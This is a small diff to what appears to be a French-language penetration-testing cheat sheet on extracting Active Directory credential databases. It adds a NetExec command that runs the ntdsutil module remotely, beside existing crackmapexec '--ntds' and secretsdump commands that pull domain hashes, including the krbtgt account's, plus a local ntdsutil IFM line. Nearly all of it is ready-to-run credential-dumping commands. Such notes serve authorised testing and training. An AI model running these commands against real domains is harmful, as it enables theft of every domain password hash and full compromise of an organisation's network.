@@ -68,6 +68,9 @@ ntdsutil "ac in ntds" "ifm" "cr fu c:\temp" q q
 ### A distance
 
 ```
+## utilise à distance ntdsutil
+nxc smb ip -u user -p pass -M ntdsutil
+
 crackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds
 
 secretsdump.py -just-dc-user $AD_DOMAIN/krbtgt  $AD_DOMAIN/$AD_USER:$AD_PASSWORD@$TARGET_IP
